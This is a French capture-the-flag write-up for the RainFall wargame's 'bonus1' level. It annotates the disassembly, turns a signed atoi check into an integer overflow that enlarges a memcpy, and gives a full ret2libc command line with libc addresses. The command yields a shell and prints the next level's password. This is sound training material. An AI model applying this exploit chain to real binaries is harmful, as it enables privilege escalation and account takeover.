    __                          ___
   / /_  ____  ____  __  ______<  /
  / __ \/ __ \/ __ \/ / / / ___/ / 
 / /_/ / /_/ / / / / /_/ (__  ) /  
/_.___/\____/_/ /_/\__,_/____/_/   
                                   
                                   

>$ bonus1@RainFall:~$ ./bonus1
   Segmentation fault (core dumped)
   
>$ bonus1@RainFall:~$ ./bonus1 AAAA

>$ bonus1@RainFall:~$ ./bonus1 AAAA BBBB

Ici le programme segfault lorqu'on ne lui donne pas d'argument. Avec un ou plusieurs le programme semble s'executer mais rien ne se passse.

>$ bonus1@RainFall:~$ objdump -d bonus1

On peut observer la présence d'un <main>, contenant notamment memcpy(). Nous savons que memcpy() comme strcat() et d'autres fonction ne verifie
pas la taille du buffer, un bufferoverflow est donc envisageable.

Regardons le <main> de plus prés :
____________________________________________________________________________________________________________________________________________________________________

(gdb) disas main                                                
Dump of assembler code for function main:                       
   0x08048424 <+0>:	push   %ebp                             
   0x08048425 <+1>:	mov    %esp,%ebp                        
   0x08048427 <+3>:	and    $0xfffffff0,%esp                 
   0x0804842a <+6>:	sub    $0x40,%esp                      
   
   ----------------------------------------------------------------------------------------------------------------------------------------------------------------
   
   0x0804842d <+9>:	mov    0xc(%ebp),%eax             (1)   Ici on récupére l'adresse AV[0] "./bonus1"     
   0x08048430 <+12>:	add    $0x4,%eax                   -    à laquelle on ajoute 4 afin d'avoir notre l'adresse 1er argument AV[1]                   
   0x08048433 <+15>:	mov    (%eax),%eax                 -    le contenu à cette adresse "AAAA" est récupéré à son tour
   0x08048435 <+17>:	mov    %eax,(%esp)                 -    et push en argument sur la stack
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>        -    pour la fonction atoi() qui nous retournera un int X
   0x0804843d <+25>:	mov    %eax,0x3c(%esp)             -    celui ci est stocké sur la stack
   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)             -    et comparé à la valeur 9 
   0x08048446 <+34>:	jle    0x804844f <main+43>         -    si X <= 9 alors le jump JLE s'effectue le programme se pousuit, JLE peut être
   0x08048448 <+36>:	mov    $0x1,%eax                        utilisé avec des nombres signé 
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>        -    si X > 9 alors le jump JMP s'effectue le programme exit    
   0x0804844f <+43>:	mov    0x3c(%esp),%eax             -    JLE nous fait atterir ici ou on retrouve X 
   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx           -    multiplié par 4 et stocké dans le registre ECX
   
   -----------------------------------------------------------------------------------------------------------------------------------------------------------------
   
   0x0804845a <+54>:	mov    0xc(%ebp),%eax             (2)   Ici on récupére de nouveau l'adresse AV[0] "./bonus1"              
   0x0804845d <+57>:	add    $0x8,%eax                   -    mais cette fois ci on ajoute 8 afin d'avoir notre l'adresse 2eme argument AV[2] 
   0x08048460 <+60>:	mov    (%eax),%eax                 -    le contenu à cette adresse "BBBB" est récupéré à son tour
   0x08048462 <+62>:	mov    %eax,%edx                   -    puis stocké dans le regidtre EDX
   0x08048464 <+64>:	lea    0x14(%esp),%eax             -    
   0x08048468 <+68>:	mov    %ecx,0x8(%esp)              -    ECX -> size_t n         -> 1er arg x4
   0x0804846c <+72>:	mov    %edx,0x4(%esp)              -    EDX -> const void *src  -> 2eme arg 
   0x08048470 <+76>:	mov    %eax,(%esp)                 -    EAX -> void *dest
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>      -    void *memcpy(void *dest, const void *src, size_t n);
   
   -----------------------------------------------------------------------------------------------------------------------------------------------------------------
   
   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)     (3)   Ici X est comparé à 0x574f4c46
   0x08048480 <+92>:	jne    0x804849e <main+122>        -    si X != 0x574f4c46 alors le programme exit
   0x08048482 <+94>:	movl   $0x0,0x8(%esp)              -    si X == 0x574f4c46 alors le programme execute execl(file,pathfile)
   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)        -    0x8048580 = "sh" 
   0x08048492 <+110>:	movl   $0x8048583,(%esp)           -    0x8048583 = "/bin/sh"
   0x08048499 <+117>:	call   0x8048350 <execl@plt>       -    execl("sh","/bin/sh") 
   0x0804849e <+122>:	mov    $0x0,%eax
   0x080484a3 <+127>:	leave
   0x080484a4 <+128>:	ret
   
End of assembler dump.
____________________________________________________________________________________________________________________________________________________________________



Après étude du <main> on déduis que notre 1er arg (x4) definit le nombre de caratère contenu dans notre 2eme arg qui vont être copié.


Si nous parvenons à faire en sorte que la valeur de notre 1er arg (x4) soit plus grand que celle du buffer, un deuxiéme argument bien agencé pourrait nous
permettre un bufferoverflow.

0x0804842a <+6>:	sub    $0x40,%esp

Cette ligne nous apprend que notre buffer est de size ~ 64 

Or, le 1er arg ne peut dépasser 9 ce qui nous copie au maximum que 36 caractères ...

Nous pouvons cependant tester des valeurs negatives, on constate que la fonction segfault lors du memcpy() car celle ci ne peut pas copier un nombre negatif de 
caractère

INTEGER OVERFLOW

An Integer Overflow is the condition that occurs when the result of an arithmetic operation, such as multiplication or addition, exceeds the maximum size 
of the integer type used to store it. When an integer overflow occurs, the interpreted value will appear to have “wrapped around” the maximum value and started 
again at the minimum value.

-2147483648 * 4 = 0
(-2147483648 + 1) * 4 = 4
(-2147483648 + 5) * 4 = 20

On a donc :
(-2147483648 + n) * 4 = n * 4

On déduis :
(-2147483648 + 20) * 4 = 80

On a alors 1er arg = -2147483628  ce qui nous permettra de copier 80 caractères, de quoi bien dépasser notre buffer.

Determinons l'offset de notre notre buffer : (https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)
On trouve OFFSET -- > 56

Nous allons pouvoir monter notre exploit returntolibc pour ce faire il nous faut :

- 1er arg qui nous permettent de copier assez de caractère pour overflow le buffer      --> -2147483628
- OFFSET                                                                                --> 56
- l'adresse de system()   ---> (gdb) p system                                           --> 0xb7e6b060
- l'adresse de exit()     ---> (gdb) p exit                                             --> 0xb7e5ebe0
- l'adresse de "/bin/sh" que nous avons deja dans le disas                              --> 0x8048583

Ce qui nous donne l'exploit suivante :

>$ bonus1@RainFall:~$ ./bonus1 -2147483628 $(python -c 'print("A" * 56 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x83\x85\x04\x08")')
  $ whoami
  bonus2
  $ cat /home/user/bonus2/.pass
  579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

Next ...


